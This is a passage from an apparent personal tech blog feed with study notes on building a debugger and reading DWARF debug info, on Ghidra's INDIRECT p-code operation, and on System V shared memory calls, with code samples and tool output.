<span class="type">int</span> rc = resume_from_breakpoint(child_pid, dbp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        pntmsg(<span class="string">&quot;child exited\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        pntmsg(<span class="string">&quot;unexpected: %d\n&quot;</span>, rc);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="debug-info"><a class="markdownIt-Anchor" href="#debug-info">#</a> debug info</h1><p>ELF 中用的 debug 信息格式是 DWARF<br> 其中类似 <code>DW_TAG_compile_unit</code>  的是 dwarf 的 tag<br>ps: readelf 也能看到 <code>readelf --debug-dump ./traceproc2 &gt; readelf</code> <br>ps: gcc 产生 dwarf  <code>gcc -gdwarf-4 -no-pie -o traceproc2 traceproc2.c</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">objdump --dwarf=info ./traceproc2</span> </span><br><span class="line"></span><br><span class="line">./traceproc2:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of the .debug_info section:</span><br><span class="line"></span><br><span class="line">  Compilation Unit @ offset 0x0:</span><br><span class="line">   Length:        0x343 (32-bit)</span><br><span class="line">   Version:       4</span><br><span class="line">   Abbrev Offset: 0x0</span><br><span class="line">   Pointer Size:  8</span><br><span class="line"> &lt;0&gt;&lt;b&gt;: Abbrev Number: 1 (DW_TAG_compile_unit)</span><br><span class="line">    &lt;c&gt;   DW_AT_producer    : (indirect string, offset: 0x18): GNU C17 9.4.0 -mtune=generic -march=x86-64 -g -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection -fcf-protection</span><br><span class="line">    &lt;10&gt;   DW_AT_language    : 12       (ANSI C99)</span><br><span class="line">    &lt;11&gt;   DW_AT_name        : (indirect string, offset: 0x143): traceproc2.c</span><br><span class="line">    &lt;15&gt;   DW_AT_comp_dir    : (indirect string, offset: 0x1bd): /home/squ/proj/debugger-impl/debugger-impl/subject</span><br><span class="line">    &lt;19&gt;   DW_AT_low_pc      : 0x401136               &lt;-&lt; do_stuff</span><br><span class="line">    &lt;21&gt;   DW_AT_high_pc     : 0x60</span><br><span class="line">    &lt;29&gt;   DW_AT_stmt_list   : 0x0</span><br><span class="line"> &lt;1&gt;&lt;2d&gt;: Abbrev Number: 2 (DW_TAG_typedef)</span><br><span class="line">    &lt;2e&gt;   DW_AT_name        : (indirect string, offset: 0xc5): size_t</span><br><span class="line">    &lt;32&gt;   DW_AT_decl_file   : 2</span><br><span class="line">    &lt;33&gt;   DW_AT_decl_line   : 209</span><br><span class="line">    &lt;34&gt;   DW_AT_decl_column : 23</span><br><span class="line">    &lt;35&gt;   DW_AT_type        : &lt;0x39&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0000000000401136 &lt;do_stuff&gt;:</span><br><span class="line">  401136:       f3 0f 1e fa             endbr64 </span><br><span class="line">  40113a:       55                      push   %rbp</span><br><span class="line">  40113b:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">  </span><br><span class="line">  (···)</span><br><span class="line">  </span><br><span class="line">  40117b:c9                   leaveq </span><br><span class="line">  40117c:c3                   retq   </span><br><span class="line"></span><br><span class="line">000000000040117d &lt;main&gt;:</span><br><span class="line">  40117d:       f3 0f 1e fa             endbr64 </span><br><span class="line">  401181:       55                      push   %rbp</span><br><span class="line">  </span><br><span class="line">  (···)</span><br><span class="line">  </span><br><span class="line">  401195:       c3                      retq   </span><br><span class="line">  401196:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再往下能看到两个 subprogram tab 的，记录了函数名 函数长度 和函数起始地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;&lt;2e2&gt;: Abbrev Number: 16 (DW_TAG_subprogram)</span><br><span class="line">   &lt;2e3&gt;   DW_AT_external    : 1</span><br><span class="line">   &lt;2e3&gt;   DW_AT_name        : (indirect string, offset: 0x1f0): main      &lt;&lt;- name</span><br><span class="line">   &lt;2e7&gt;   DW_AT_decl_file   : 1</span><br><span class="line">   &lt;2e8&gt;   DW_AT_decl_line   : 14</span><br><span class="line">   &lt;2e9&gt;   DW_AT_decl_column : 5</span><br><span class="line">   &lt;2ea&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class="line">   &lt;2ee&gt;   DW_AT_low_pc      : 0x40117d                                    &lt;&lt;- addr</span><br><span class="line">   &lt;2f6&gt;   DW_AT_high_pc     : 0x19                                        &lt;&lt;- offset of end</span><br><span class="line">   &lt;2fe&gt;   DW_AT_frame_base  : 1 byte block: 9c (DW_OP_call_frame_cfa)</span><br><span class="line">   &lt;300&gt;   DW_AT_GNU_all_tail_call_sites: 1</span><br><span class="line">&lt;1&gt;&lt;300&gt;: Abbrev Number: 17 (DW_TAG_subprogram)</span><br><span class="line">   &lt;301&gt;   DW_AT_external    : 1</span><br><span class="line">   &lt;301&gt;   DW_AT_name        : (indirect string, offset: 0x1a1): do_stuff</span><br><span class="line">   &lt;305&gt;   DW_AT_decl_file   : 1</span><br><span class="line">   &lt;306&gt;   DW_AT_decl_line   : 4</span><br><span class="line">   &lt;307&gt;   DW_AT_decl_column : 6</span><br><span class="line">   &lt;308&gt;   DW_AT_prototyped  : 1</span><br><span class="line">   &lt;308&gt;   DW_AT_low_pc      : 0x401136</span><br><span class="line">   &lt;310&gt;   DW_AT_high_pc     : 0x47</span><br><span class="line">   &lt;318&gt;   DW_AT_frame_base  : 1 byte block: 9c (DW_OP_call_frame_cfa)</span><br></pre></td></tr></table></figure><ul><li>第一个 <code>&lt;&gt;</code>  为嵌套深度</li><li>对于标记了 DW_TAG_variable tab 的变量。DW_AT_type 能根据第二列 <code>&lt; &gt;</code>  里的数字找到对应的定义（大小类型）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;&lt;300&gt;: Abbrev Number: 17 (DW_TAG_subprogram)</span><br><span class="line">   &lt;301&gt;   DW_AT_external    : 1</span><br><span class="line">   &lt;301&gt;   DW_AT_name        : (indirect string, offset: 0x1a1): do_stuff</span><br><span class="line">   &lt;305&gt;   DW_AT_decl_file   : 1</span><br><span class="line">   &lt;306&gt;   DW_AT_decl_line   : 4</span><br><span class="line">   &lt;307&gt;   DW_AT_decl_column : 6</span><br><span class="line">   &lt;308&gt;   DW_AT_prototyped  : 1</span><br><span class="line">   &lt;308&gt;   DW_AT_low_pc      : 0x401136</span><br><span class="line">   &lt;310&gt;   DW_AT_high_pc     : 0x47</span><br><span class="line">   &lt;318&gt;   DW_AT_frame_base  : 1 byte block: 9c (DW_OP_call_frame_cfa)</span><br><span class="line">   &lt;31a&gt;   DW_AT_GNU_all_tail_call_sites: 1</span><br><span class="line">&lt;2&gt;&lt;31a&gt;: Abbrev Number: 18 (DW_TAG_formal_parameter)</span><br><span class="line">   &lt;31b&gt;   DW_AT_name        : (indirect string, offset: 0x11a): my_arg</span><br><span class="line">   &lt;31f&gt;   DW_AT_decl_file   : 1</span><br><span class="line">   &lt;320&gt;   DW_AT_decl_line   : 4</span><br><span class="line">   &lt;321&gt;   DW_AT_decl_column : 19</span><br><span class="line">   &lt;322&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class="line">   &lt;326&gt;   DW_AT_location    : 2 byte block: 91 5c (DW_OP_fbreg: -36)</span><br><span class="line">&lt;2&gt;&lt;329&gt;: Abbrev Number: 19 (DW_TAG_variable)</span><br><span class="line">   &lt;32a&gt;   DW_AT_name        : (indirect string, offset: 0xcc): my_local</span><br><span class="line">   &lt;32e&gt;   DW_AT_decl_file   : 1</span><br><span class="line">   &lt;32f&gt;   DW_AT_decl_line   : 6</span><br><span class="line">   &lt;330&gt;   DW_AT_decl_column : 9</span><br><span class="line">   &lt;331&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class="line">   &lt;335&gt;   DW_AT_location    : 2 byte block: 91 6c (DW_OP_fbreg: -20)</span><br><span class="line">&lt;2&gt;&lt;338&gt;: Abbrev Number: 20 (DW_TAG_variable)</span><br><span class="line">   &lt;339&gt;   DW_AT_name        : i</span><br><span class="line">   &lt;33b&gt;   DW_AT_decl_file   : 1</span><br><span class="line">   &lt;33c&gt;   DW_AT_decl_line   : 7</span><br><span class="line">   &lt;33d&gt;   DW_AT_decl_column : 9</span><br><span class="line">   &lt;33e&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class="line">   &lt;342&gt;   DW_AT_location    : 2 byte block: 91 68 (DW_OP_fbreg: -24)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;&lt;65&gt;: Abbrev Number: 5 (DW_TAG_base_type)      &lt;- 65</span><br><span class="line">   &lt;66&gt;   DW_AT_byte_size   : 4</span><br><span class="line">   &lt;67&gt;   DW_AT_encoding    : 5(signed)</span><br><span class="line">   &lt;68&gt;   DW_AT_name        : int</span><br></pre></td></tr></table></figure><p>在 <code>DW_AT_location</code>  处  <code>DW_OP_fbreg</code>  记录了相对某个给定的 stack frame 的偏移 (说是就是 rbp 然后 ± 一点 offset，但是我没找到)</p><blockquote><p>The DW_OP_fbreg operation provides a signed LEB128 offset from the address specified by the location description in the DW_AT_frame_base attribute of the current function. (This is typically a “stack pointer” register plus or minus some offset. On more sophisticated systems it might be a location list that adjusts the offset according to changes in the stack pointer as the PC changes.)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0000000000401136 &lt;do_stuff&gt;:</span><br><span class="line">  401136:f3 0f 1e fa          endbr64 </span><br><span class="line">  40113a:55                   push   %rbp</span><br><span class="line">  40113b:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  40113e:48 83 ec 20          sub    $0x20,%rsp</span><br><span class="line">  401142:89 7d ec             mov    %edi,-0x14(%rbp)</span><br><span class="line">  401145:8b 45 ec             mov    -0x14(%rbp),%eax</span><br><span class="line">  401148:83 c0 02             add    $0x2,%eax</span><br><span class="line">  40114b:89 45 fc             mov    %eax,-0x4(%rbp)</span><br><span class="line">  40114e:c7 45 f8 00 00 00 00 movl   $0x0,-0x8(%rbp)</span><br><span class="line">  401155:eb 1a                jmp    401171 &lt;do_stuff+0x3b&gt;</span><br><span class="line">  401157:8b 45 f8             mov    -0x8(%rbp),%eax</span><br><span class="line">  40115a:89 c6                mov    %eax,%esi</span><br><span class="line">  40115c:48 8d 3d a1 0e 00 00 lea    0xea1(%rip),%rdi        # 402004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">  401163:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401168:e8 d3 fe ff ff       callq  401040 &lt;printf@plt&gt;</span><br><span class="line">  40116d:83 45 f8 01          addl   $0x1,-0x8(%rbp)</span><br><span class="line">  401171:8b 45 f8             mov    -0x8(%rbp),%eax</span><br><span class="line">  401174:3b 45 fc             cmp    -0x4(%rbp),%eax</span><br><span class="line">  401177:7c de                jl     401157 &lt;do_stuff+0x21&gt;</span><br><span class="line">  401179:90                   nop</span><br><span class="line">  40117a:90                   nop</span><br><span class="line">  40117b:c9                   leaveq </span><br><span class="line">  40117c:c3                   retq  </span><br></pre></td></tr></table></figure><p>c 行数与汇编的映射关系通过以下得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">objdump --dwarf=decodedline ./traceproc2</span> </span><br><span class="line"></span><br><span class="line">./traceproc2:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of the .debug_line section:</span><br><span class="line"></span><br><span class="line">CU: ./traceproc2.c:</span><br><span class="line">File name                            Line number    Starting address    View    Stmt</span><br><span class="line">traceproc2.c                                   5            0x401136               x</span><br><span class="line">traceproc2.c                                   6            0x401145               x</span><br><span class="line">traceproc2.c                                   9            0x40114e               x</span><br><span class="line">(··· ··· ···)</span><br><span class="line">traceproc2.c                                  18            0x401196               x</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1/&quot;&gt;How debuggers work: Part 1 - Basics - Eli Bendersky’s websi</summary>
      
    
    
    
    <category term="basic" scheme="https://squirre17.github.io/categories/basic/"/>
    
    
    <category term="debugger" scheme="https://squirre17.github.io/tags/debugger/"/>
    
  </entry>
  
  <entry>
    <title>Ghidra-INDIRECT-explanation</title>
    <link href="https://squirre17.github.io/2022/10/26/Ghidra-INDIRECT-explanation/"/>
    <id>https://squirre17.github.io/2022/10/26/Ghidra-INDIRECT-explanation/</id>
    <published>2022-10-26T10:05:02.000Z</published>
    <updated>2022-11-03T11:13:00.565Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined4 <span class="title function_">FUN_000114b8</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 in_r3;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s(%d)\n&quot;</span>,<span class="string">&quot;part_data_end&quot;</span>,<span class="number">0x7d</span>,in_r3,in_r3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>output result as following (pcode-refined)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(ram, 0x114d4, 4) INDIRECT (ram, 0x114d4, 4) , (const, 0x15, 4)</span><br><span class="line">(ram, 0x114d8, 4) INDIRECT (ram, 0x114d8, 4) , (const, 0x15, 4)</span><br><span class="line"> ---  CALL (ram, 0x10ba4, 8) , (ram, 0x114d8, 4) , (ram, 0x114d4, 4) , (const, 0x7d, 4) , (register, 0x2c, 4) , (register, 0x2c, 4)</span><br><span class="line"></span><br><span class="line">(register, 0x20, 4) COPY (const, 0x0, 4)</span><br><span class="line">(ram, 0x114d4, 4) COPY (ram, 0x114d4, 4)</span><br><span class="line">(ram, 0x114d8, 4) COPY (ram, 0x114d8, 4)</span><br><span class="line"></span><br><span class="line"> ---  RETURN (const, 0x0, 4) , (register, 0x20, 4)</span><br></pre></td></tr></table></figure><p>M4rsuri’s explanation(<a href="https://github.com/NationalSecurityAgency/ghidra/issues/2744">INDIRECT pcode op, input1 misunderstood · Issue #2744 · NationalSecurityAgency/ghidra · GitHub</a>)</p><pre><code>I think that INDIRECT just indicates the varnode in output can be affected by the pcode indicated by it's input1.So it's impossible for a varnode to be affected when it's both not the output of an instruction and it's not associated with the instruction through an INDIRECT.In other words, the varnodes being the output of all INDIRECTs associated with an instruction is the over-approximation of all varnodes that may be affected by the execution of this instruction. Only CALL/CALLIND instructions can have side affects because we need to take the execution of their corresponding subroutines into consideration. So INDIRECT instructions only appear before CALL/CALLIND instructions.I wonder if my understanding is proper.Thank you.</code></pre><p>INDIRECT pass input0 to output, but output be affected by some pcode indicated by input1 possibly.<br>Affect means “be changed” and so on in a narrow sense.<br>because we don’t know what the subroutine indicated by subsequent CALL pcode that take out our parameter’s address will do .Isn’t it? Maybe it can modify the content in the corresponding address. So it’s value is indirected when machine is executed to the next COPY pcode and pass it to other varnode.(so INDIRECT meaning - varnode passed through other subroutine before reaching its destination)<br> <code>A special address space indicates input1's use as an internal reference encoding</code>  simply means the Seqnum which indicates the sequence number of anyone pcode.</p><p>if u print out above CALL pcode’s seqnum, u will find it exactly is  <code>0x15</code>  (const, 0x15, 4).</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(ram, <span class="number">0x114c8</span>, <span class="number">67</span>, <span class="number">0</span>)</span><br><span class="line">(ram, <span class="number">0x114d4</span>, <span class="number">4</span>) INDIRECT (ram, <span class="number">0x114d4</span>, <span class="number">4</span>) , (<span class="type">const</span>, <span class="number">0x15</span>, <span class="number">4</span>)</span><br><span class="line">(ram, <span class="number">0x114c8</span>, <span class="number">69</span>, <span class="number">1</span>)</span><br><span class="line">(ram, <span class="number">0x114d8</span>, <span class="number">4</span>) INDIRECT (ram, <span class="number">0x114d8</span>, <span class="number">4</span>) , (<span class="type">const</span>, <span class="number">0x15</span>, <span class="number">4</span>)</span><br><span class="line">(ram, <span class="number">0x114c8</span>, <span class="number">21</span>, <span class="number">2</span>)                                             &lt;&lt;- <span class="number">21</span> = <span class="number">0x15</span></span><br><span class="line"> ---  CALL (ram, <span class="number">0x10ba4</span>, <span class="number">8</span>) , (ram, <span class="number">0x114d8</span>, <span class="number">4</span>) , (ram, <span class="number">0x114d4</span>, <span class="number">4</span>) , (<span class="type">const</span>, <span class="number">0x7d</span>, <span class="number">4</span>) , (<span class="keyword">register</span>, <span class="number">0x2c</span>, <span class="number">4</span>) , (<span class="keyword">register</span>, <span class="number">0x2c</span>, <span class="number">4</span>)</span><br><span class="line">(ram, <span class="number">0x114cc</span>, <span class="number">29</span>, <span class="number">3</span>) </span><br><span class="line">(<span class="keyword">register</span>, <span class="number">0x20</span>, <span class="number">4</span>) COPY (<span class="type">const</span>, <span class="number">0x0</span>, <span class="number">4</span>)</span><br><span class="line">(ram, <span class="number">0x114d0</span>, <span class="number">68</span>, <span class="number">4</span>)</span><br><span class="line">(ram, <span class="number">0x114d4</span>, <span class="number">4</span>) COPY (ram, <span class="number">0x114d4</span>, <span class="number">4</span>)</span><br><span class="line">(ram, <span class="number">0x114d0</span>, <span class="number">70</span>, <span class="number">5</span>)</span><br><span class="line">(ram, <span class="number">0x114d8</span>, <span class="number">4</span>) COPY (ram, <span class="number">0x114d8</span>, <span class="number">4</span>)</span><br><span class="line">(ram, <span class="number">0x114d0</span>, <span class="number">44</span>, <span class="number">6</span>)</span><br><span class="line"> ---  RETURN (<span class="type">const</span>, <span class="number">0x0</span>, <span class="number">4</span>) , (<span class="keyword">register</span>, <span class="number">0x20</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>Thanks M4tsuri for his help.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="Static Analysis" scheme="https://squirre17.github.io/categories/Static-Analysis/"/>
    
    
    <category term="Ghidra" scheme="https://squirre17.github.io/tags/Ghidra/"/>
    
  </entry>
  
  <entry>
    <title>shared-memory-and-semaphore-machenism</title>
    <link href="https://squirre17.github.io/2022/10/18/shared-memory-and-semaphore-machenism/"/>
    <id>https://squirre17.github.io/2022/10/18/shared-memory-and-semaphore-machenism/</id>
    <published>2022-10-18T06:57:37.000Z</published>
    <updated>2022-10-18T07:05:35.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分类"><a class="markdownIt-Anchor" href="#分类">#</a> 分类</h1><ul><li>管道</li><li>消息队列</li><li>信号</li><li>共享内存</li><li>信号量</li><li>套接字</li></ul><h1 id="共享内存"><a class="markdownIt-Anchor" href="#共享内存">#</a> 共享内存</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shmget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">size_t</span> size, <span class="type">int</span> shmflg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">const</span> <span class="type">void</span> *shmaddr, <span class="type">int</span> shmflg)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">shmdt</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *shmaddr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">shmctl</span><span class="params">(<span class="type">int</span> shmid, <span class="type">int</span> cmd, <span class="keyword">struct</span> shmid_ds *buf)</span>;</span><br></pre></td></tr></table></figure><pre><code>   shmget()  returns  the identifier of the System V shared memory segment associated with the value of the argument key.  It may be used either to obtain the identifier of a previously created shared memory segment  (when shmflg is zero and key does not have the value IPC_PRIVATE), or to create a new set.</code></pre><p>shmflg 和文件的控制权限一样。<br>注意到如果 key 是 <code>IPC_PRIVATE</code> ，那就相当于匿名 shm，只能用于有亲属关系的进程通信。</p><pre><code>   shmat()  attaches  the  System V shared memory segment identified by shmid to the address space of the calling process.  The attaching address is specified by shmaddr with one of the following criteria:</code></pre><p>shmaddr 一般为空 让操作系统决定</p><pre><code>   shmdt() detaches the shared memory segment located at the address specified by shmaddr from the address  space of the calling process.   shmctl()  performs  the control operation specified by cmd on the System V shared memory segment whose identifier is given in shmid.</code></pre><p>删除共享内存用 <code>PC_RMID</code></p><h2 id="实操1"><a class="markdownIt-Anchor" href="#实操1">#</a> 实操 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATHNAME <span class="string">&quot;.&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROJ_ID 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> shmid;</span><br><span class="line">    <span class="type">key_t</span> key = ftok(PATHNAME, PROJ_ID);</span><br><span class="line">    assert(key != <span class="number">-1</span>);</span><br><span class="line">    shmid = shmget(key, PAGE_SIZE, <span class="number">0640</span>|IPC_CREAT);</span><br><span class="line">    assert(shmid != <span class="number">-1</span>);</span><br><span class="line">    <span class="type">char</span> *shmptr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;shmptr is %p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;procid is %d\n&quot;</span></span><br><span class="line">        ,shmptr, getpid()</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">memset</span>(shmptr, <span class="string">&quot;A&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    shmdt(shmptr);</span><br><span class="line">    <span class="type">int</span> res = shmctl(shmid, IPC_RMID, <span class="number">0</span>);</span><br><span class="line">    assert(res != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用一个可以访问的目录创建 shmid（proj 号和当前目录可以返回一个唯一的 shmid）<br>在当前路径下创建一次共享内存 不删除的话就一直存在。</p><p>用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipcs -m # 查看所有共享内存</span><br><span class="line">ipcrm -m &lt;shmid&gt; # 删除一个共享内存</span><br></pre></td></tr></table></figure><h2 id="实操2"><a class="markdownIt-Anchor" href="#实操2">#</a> 实操 2</h2><p>server.c 用来创建共享内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span 